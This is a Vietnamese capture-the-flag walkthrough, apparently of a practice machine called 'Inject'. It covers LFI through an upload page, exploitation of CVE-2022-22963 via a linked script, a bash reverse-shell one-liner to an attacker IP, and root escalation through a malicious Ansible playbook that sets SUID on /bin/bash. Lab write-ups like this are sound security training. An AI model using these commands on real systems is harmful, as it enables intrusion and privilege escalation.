# inject

liệt kê thấy p22 và 8080

![https://lh7-us.googleusercontent.com/q2u9949TS3sdYuTjZFWHr2BFlNCls12EaRixohP5N30rAx3y1nqBRa0Kr5QdHSbQkzoA8bfLr7dyp2LiHMvTdhtNK2WEsjsoZaroqDzb7_urYpkbFOLzdIoSrzw9y4TvFDF9Wnhzsvai](https://lh7-us.googleusercontent.com/q2u9949TS3sdYuTjZFWHr2BFlNCls12EaRixohP5N30rAx3y1nqBRa0Kr5QdHSbQkzoA8bfLr7dyp2LiHMvTdhtNK2WEsjsoZaroqDzb7_urYpkbFOLzdIoSrzw9y4TvFDF9Wnhzsvai)

truy cập p8080 chỉ thấy chức năng upload hoạt động

![https://lh7-us.googleusercontent.com/1XGOixQOySHtix6mrqJmAbxgs44o1dD8XUqqZg_FV3CikikppkmECJcz72REmMHclXVI_jjde7BlCogU8VOI1xzz4OQxp9w7TBViR-sV6BgzR4DB9HaWOxCNx93PA0kjLMdbyculY8dZ](https://lh7-us.googleusercontent.com/1XGOixQOySHtix6mrqJmAbxgs44o1dD8XUqqZg_FV3CikikppkmECJcz72REmMHclXVI_jjde7BlCogU8VOI1xzz4OQxp9w7TBViR-sV6BgzR4DB9HaWOxCNx93PA0kjLMdbyculY8dZ)

chỉ chấp nhận upload file image, sau khi upload thì có url đến image

![https://lh7-us.googleusercontent.com/wRmd7Ske9J6WCTbcnrTGLc1VKd1j84s56q-CAJCRrgQDVKeyh4hlltcH6vobxeF9OE2TDQBhLi9OzX_kjsWL4ATAlHiDR-28RxCdegJC5weI6r_IObqi7VcxN-5AUXnbyoVJ6QhFdb1u](https://lh7-us.googleusercontent.com/wRmd7Ske9J6WCTbcnrTGLc1VKd1j84s56q-CAJCRrgQDVKeyh4hlltcH6vobxeF9OE2TDQBhLi9OzX_kjsWL4ATAlHiDR-28RxCdegJC5weI6r_IObqi7VcxN-5AUXnbyoVJ6QhFdb1u)

có thể LFI

![https://lh7-us.googleusercontent.com/MRHI1OtYr51hVxLUaAjBcdvR48Oq4R6bcjb_6Jeqp81fG4rTRne_5Cni0Sw7PfT2_tQyhEAUgns2Zg5d-XM99Y6IXSANszEz8ZloN_IaRXtL95qKWQTUfZ-nRScaJCC33-UEQdaGNQxQ](https://lh7-us.googleusercontent.com/MRHI1OtYr51hVxLUaAjBcdvR48Oq4R6bcjb_6Jeqp81fG4rTRne_5Cni0Sw7PfT2_tQyhEAUgns2Zg5d-XM99Y6IXSANszEz8ZloN_IaRXtL95qKWQTUfZ-nRScaJCC33-UEQdaGNQxQ)

đọc được file pw

![https://lh7-us.googleusercontent.com/FN0rVZv20j5nHjIGczMiXdTOPs9q0T_n8saBDxr6nRLnSt1zBBw505s7AolHhusO5YdC_bS-OP8hofjRQ3Ow4vALHpMkpq6xRumlqjEsRXJYjkBg1peRQYSUSTkCzNhfR0iPuSprmZD7](https://lh7-us.googleusercontent.com/FN0rVZv20j5nHjIGczMiXdTOPs9q0T_n8saBDxr6nRLnSt1zBBw505s7AolHhusO5YdC_bS-OP8hofjRQ3Ow4vALHpMkpq6xRumlqjEsRXJYjkBg1peRQYSUSTkCzNhfR0iPuSprmZD7)

nhưng ko lấy được flag user

![https://lh7-us.googleusercontent.com/gpV8B_pTV-SlQX0AerelhOCIIMCUml6Tz0_pWeBqlTHAOT3MSWNliUHVG5JxJzMmpNcKus2wztT29XGWp6OqDHMEVsMgsKzeWJwIF3mJUK4hd5jQeVkN93o_UaksOSdsXL2Fh-2NLdQB](https://lh7-us.googleusercontent.com/gpV8B_pTV-SlQX0AerelhOCIIMCUml6Tz0_pWeBqlTHAOT3MSWNliUHVG5JxJzMmpNcKus2wztT29XGWp6OqDHMEVsMgsKzeWJwIF3mJUK4hd5jQeVkN93o_UaksOSdsXL2Fh-2NLdQB)

tìm thấy credentials

![https://lh7-us.googleusercontent.com/ffF2bPFC3WMuTXcoFGzDuJc-7JAzLkIgtsNmKRV_8tCku2BSYiICJTZUxltB6xawR90Ph_5CQL30zaPP8MXwFMLjPWrO5YdcG6KzNt31wYtMnbE1c37rN3T_YdO2rHy8eWkjSgO70xuS](https://lh7-us.googleusercontent.com/ffF2bPFC3WMuTXcoFGzDuJc-7JAzLkIgtsNmKRV_8tCku2BSYiICJTZUxltB6xawR90Ph_5CQL30zaPP8MXwFMLjPWrO5YdcG6KzNt31wYtMnbE1c37rN3T_YdO2rHy8eWkjSgO70xuS)

DocPhillovestoInject123

nhưng pw ko hoạt động với phil, frank hay root vì có thể cần key

tìm thấy pom.xml (tệp cấu hình được sử dụng trong các dự án Java giúp quản lý các phần phụ thuộc và xây dựng process. Nó chứa thông tin về dự án, chẳng hạn như tên, phiên bản và các phụ thuộc vào các thư viện phần mềm khác).

→ xem xét có sử dụng bất kỳ thư viện không an toàn hoặc lỗi thời nào hay không bằng cách xem xét các phần phụ thuộc được liệt kê trong tệp.

![https://lh7-us.googleusercontent.com/5aCBhq_ZyAq4MvR0tTVjn8KrUMF6LRispQhn59pu8eH3oriRfFXE_XwfhcboAEi7nSKXOGsJJyYn1ZoxY3Eu8ycgwujbXImMYFHIchiz_VbrWEZCJJKwkMn5_0y2bs7WFPyrT06eGzls](https://lh7-us.googleusercontent.com/5aCBhq_ZyAq4MvR0tTVjn8KrUMF6LRispQhn59pu8eH3oriRfFXE_XwfhcboAEi7nSKXOGsJJyYn1ZoxY3Eu8ycgwujbXImMYFHIchiz_VbrWEZCJJKwkMn5_0y2bs7WFPyrT06eGzls)

![https://lh7-us.googleusercontent.com/PKHBoJBN-pKToHmQE6-cPOD8RPM4Ym4G8g6KJN4yz8zQQlKbVIJQmxLf0Do0tEcCYJZaYKA-IbMe5guA1dBuIeiWJPZIECSbsp1fgRCa4UIz1H_VYvHvQkrYi1Tvay2fxkRiwDF1emMq](https://lh7-us.googleusercontent.com/PKHBoJBN-pKToHmQE6-cPOD8RPM4Ym4G8g6KJN4yz8zQQlKbVIJQmxLf0Do0tEcCYJZaYKA-IbMe5guA1dBuIeiWJPZIECSbsp1fgRCa4UIz1H_VYvHvQkrYi1Tvay2fxkRiwDF1emMq)

tìm thấy 2 cve CVE-2022-22965 rce, CVE-2022-22963 In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources.

thử cve-2022-22963 thì có kết quả

exploit [https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE/blob/main/spring-cloud-rce.py](https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE/blob/main/spring-cloud-rce.py)

![https://lh7-us.googleusercontent.com/lokkobSBnfoYR34o0aWsMNy0jnkF0nNYM1GS5qNOmKwTDljiTOk2a46mxni8EvGtnxPWVBfLF6vnK8OCt9gANNemPlbz5sRjuarfGiCIifJ-D2aesZu5NRSHbnpcrxZKJ7XmKKtV3c89](https://lh7-us.googleusercontent.com/lokkobSBnfoYR34o0aWsMNy0jnkF0nNYM1GS5qNOmKwTDljiTOk2a46mxni8EvGtnxPWVBfLF6vnK8OCt9gANNemPlbz5sRjuarfGiCIifJ-D2aesZu5NRSHbnpcrxZKJ7XmKKtV3c89)

![https://lh7-us.googleusercontent.com/_qSlR_zNE-f3XLW8jqdBwhI_b1zNBLMBL83KLJt7RGjI2S2W5tgtBUXVY88oIUMLMceH0CdrSFbL75D5uLmMkH4cpt7cc-PM43Xq3u_SkfWZGYLa5keiSJuWL8lcp-oRdupDD1dtYBaA](https://lh7-us.googleusercontent.com/_qSlR_zNE-f3XLW8jqdBwhI_b1zNBLMBL83KLJt7RGjI2S2W5tgtBUXVY88oIUMLMceH0CdrSFbL75D5uLmMkH4cpt7cc-PM43Xq3u_SkfWZGYLa5keiSJuWL8lcp-oRdupDD1dtYBaA)

đang ở frank nên ko có quyền đọc user.txt

![https://lh7-us.googleusercontent.com/P8oCGVu_ye_nHqwkZmdd7a7D8CkQ1h9uk8ewnA9xot43eYjq_qu4cdK-u2zsZ38UQlNTnVPDoHwzNi7K6CTJkZyLiGI-7iAC5dg9QG9BD7arWzfdyVi3lZY5qKGwmf9j3D-avPTGN9uC](https://lh7-us.googleusercontent.com/P8oCGVu_ye_nHqwkZmdd7a7D8CkQ1h9uk8ewnA9xot43eYjq_qu4cdK-u2zsZ38UQlNTnVPDoHwzNi7K6CTJkZyLiGI-7iAC5dg9QG9BD7arWzfdyVi3lZY5qKGwmf9j3D-avPTGN9uC)

sang phil

![https://lh7-us.googleusercontent.com/U2Dmml5wvWUDHx-fGUEkJD-1cvlVva2L36TheupTbYpQddFQjMJ4B-27xbCDfrgWwNUEAyjL06bkdqsZ8UwfTOShuXzPBGK95S9siVP9JgV5_Tkc3fxjeRJ48Ew7azke8aM09oYx0tRn](https://lh7-us.googleusercontent.com/U2Dmml5wvWUDHx-fGUEkJD-1cvlVva2L36TheupTbYpQddFQjMJ4B-27xbCDfrgWwNUEAyjL06bkdqsZ8UwfTOShuXzPBGK95S9siVP9JgV5_Tkc3fxjeRJ48Ew7azke8aM09oYx0tRn)

đưa về shell dễ nhìn hơn

bash -i >& /dev/tcp/10.10.14.21/4433 0>&1

![https://lh7-us.googleusercontent.com/Nz49Uz9hUnd4QiNgdYiA59HlXu6PQMQTeh7pSUc-qw48Ybp4gQQMQom-ig3TCR0jgddTI4j-7ENskj0lXp7SJrcqopR9QPXbci6RjRLhwkXecXX6difdv2S_dhsTKHmNbjSvcR0p938g](https://lh7-us.googleusercontent.com/Nz49Uz9hUnd4QiNgdYiA59HlXu6PQMQTeh7pSUc-qw48Ybp4gQQMQom-ig3TCR0jgddTI4j-7ENskj0lXp7SJrcqopR9QPXbci6RjRLhwkXecXX6difdv2S_dhsTKHmNbjSvcR0p938g)

có được flag user

![https://lh7-us.googleusercontent.com/QGXJelgrV9uOb04_YzSum0xuOwP3YYDqVA4zuhFMgSUB3d5fyfFe_46xIqecQBmIRq0xjtoUW18E6sMPL5uzpLKTWfMjMu6wncOQcUh67o02iF_yQFhJl276KhkxBbLolOv0RreXUbTg](https://lh7-us.googleusercontent.com/QGXJelgrV9uOb04_YzSum0xuOwP3YYDqVA4zuhFMgSUB3d5fyfFe_46xIqecQBmIRq0xjtoUW18E6sMPL5uzpLKTWfMjMu6wncOQcUh67o02iF_yQFhJl276KhkxBbLolOv0RreXUbTg)

sử dụng pspy to check for running processes on the host

tạo python server tại 10.10.14.21, tại target tải pspy từ server vừa tạo

![https://lh7-us.googleusercontent.com/VAI50vPvXHhfG7_1SWDprsSC2wUtP15jjNRYWXwLKOs5dGxbpLzvDlgGk43ZVfvEF5uuND6wbWmlA4FrNTExUfcDGxSWKhgMlhd5wQa_ONkdijb3PxEc1CFLEePhPtnadkWVGWjWTTj7](https://lh7-us.googleusercontent.com/VAI50vPvXHhfG7_1SWDprsSC2wUtP15jjNRYWXwLKOs5dGxbpLzvDlgGk43ZVfvEF5uuND6wbWmlA4FrNTExUfcDGxSWKhgMlhd5wQa_ONkdijb3PxEc1CFLEePhPtnadkWVGWjWTTj7)

![https://lh7-us.googleusercontent.com/L-Ypdo--A8bMWHWpE9P2DZrZq_pgNd9OCKzUWa7y2ivouPAw5uxoPCGLe6ax3IpCINPf8e5pRN1qxPXIM7kdn5D7ykOgfl2aLex9X2OLsHQ69k8FrFF4xZJGKAtgmvVTEZAntV6X4lto](https://lh7-us.googleusercontent.com/L-Ypdo--A8bMWHWpE9P2DZrZq_pgNd9OCKzUWa7y2ivouPAw5uxoPCGLe6ax3IpCINPf8e5pRN1qxPXIM7kdn5D7ykOgfl2aLex9X2OLsHQ69k8FrFF4xZJGKAtgmvVTEZAntV6X4lto)

![https://lh7-us.googleusercontent.com/NNFIKpj3f1EM6wKgqeqy6nvdm2uRk9HwsfRqTO5efV0Dj5jfzpk3v2LcKkrzv1eOYHDmgCOc_Z4PofeeE4ucSwnzO372oK4hoxiVr8BMPAUlwYbuqM_Idh0Jos8l3REVCRqHAb5lsyxy](https://lh7-us.googleusercontent.com/NNFIKpj3f1EM6wKgqeqy6nvdm2uRk9HwsfRqTO5efV0Dj5jfzpk3v2LcKkrzv1eOYHDmgCOc_Z4PofeeE4ucSwnzO372oK4hoxiVr8BMPAUlwYbuqM_Idh0Jos8l3REVCRqHAb5lsyxy)

tìm thấy loạt hoạt động của việc lập lịch thực hiện các lệnh .yml

![https://lh7-us.googleusercontent.com/1XKAzQySyh3ZqL-RLk645uOlBnqNPwsBBSpJ34leJFdXnsYyMoB0R3ig_IEkZ7jo6-rFg8oFR9XR7uetATBt-xJAXqLVuT4dA1iFjKriEpBwnEpNEa3NnVzKNNtuO1GyyViJUZztI_-4](https://lh7-us.googleusercontent.com/1XKAzQySyh3ZqL-RLk645uOlBnqNPwsBBSpJ34leJFdXnsYyMoB0R3ig_IEkZ7jo6-rFg8oFR9XR7uetATBt-xJAXqLVuT4dA1iFjKriEpBwnEpNEa3NnVzKNNtuO1GyyViJUZztI_-4)

root (uid=0) is running ansible-parallel và ansible-playbook on *.yaml in /opt/automation/tasks.

![https://lh7-us.googleusercontent.com/TVsuiDTj8frYDgWWILwFCrMg3rAyE-EuZ8wRYY4ueHgvc_ZvaIHLGbiwb_WDSE_8K9y4teSRM4li-qaB5-PdKnq3jVmir9t7n6q0TotVSqyXZ_yR431_taS1kxBHRHzZMtO19VT5R7q9](https://lh7-us.googleusercontent.com/TVsuiDTj8frYDgWWILwFCrMg3rAyE-EuZ8wRYY4ueHgvc_ZvaIHLGbiwb_WDSE_8K9y4teSRM4li-qaB5-PdKnq3jVmir9t7n6q0TotVSqyXZ_yR431_taS1kxBHRHzZMtO19VT5R7q9)

The tasks folder is owned by root, and writable by the staff group but phil is in the staff group

![https://lh7-us.googleusercontent.com/X12klvHV8-iGgwljONyrPe6Q1YJ-WSYBLNZHxWJLlbh5mhHBB3Zof-TaCExDzUoYYD1iVxuKTsTt0DN2VgTnwDk-GW4T5QykqAESSOoeLj74AuWjW1OCGXzND0nKONTzZEI3Oj_bC_sw](https://lh7-us.googleusercontent.com/X12klvHV8-iGgwljONyrPe6Q1YJ-WSYBLNZHxWJLlbh5mhHBB3Zof-TaCExDzUoYYD1iVxuKTsTt0DN2VgTnwDk-GW4T5QykqAESSOoeLj74AuWjW1OCGXzND0nKONTzZEI3Oj_bC_sw)

Which means that phil can write to this folder:

write 1 file .yml khác với format tương tự, đặt cùng thư mục -> để lấy quyền root

```bash
- hosts: localhost
  tasks:
     - name: Evil
       ansible.builtin.shell: chmod +s /bin/bash
       become: true
```

tạo cat_root.yml và đưa sang target

![https://lh7-us.googleusercontent.com/LyJHYc0wVBWEwziAWIFYOwzzTwqjSxZybLIgNPAu_-ozwF_9OjDuziFk1lR-HQEz4A-mP0Bky4mWwu8tflpk23AT3ywm-oQpQDnfu-u-hJI3tnP9u-hFgQ_oEHJ3BMO7z8oiMwkkA2nl](https://lh7-us.googleusercontent.com/LyJHYc0wVBWEwziAWIFYOwzzTwqjSxZybLIgNPAu_-ozwF_9OjDuziFk1lR-HQEz4A-mP0Bky4mWwu8tflpk23AT3ywm-oQpQDnfu-u-hJI3tnP9u-hFgQ_oEHJ3BMO7z8oiMwkkA2nl)

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)

vì playbook có vẻ thực thi theo schedule task -> cần đợi để file cat_root thực thi

có được quyền root

![https://lh7-us.googleusercontent.com/iNwXqRWjI3V2gM84CiLlg7bVQs-McFNTdFcBiZS4zcseL94HOcH0eN8fyjcGRc-0TmkMN7oHXnKvzCNiJY6jnbsEDbGwvAxsQ1HvNAxi2zacgKVfwO3ncEcjSFY6VEJHlQntEIdbShz6](https://lh7-us.googleusercontent.com/iNwXqRWjI3V2gM84CiLlg7bVQs-McFNTdFcBiZS4zcseL94HOcH0eN8fyjcGRc-0TmkMN7oHXnKvzCNiJY6jnbsEDbGwvAxsQ1HvNAxi2zacgKVfwO3ncEcjSFY6VEJHlQntEIdbShz6)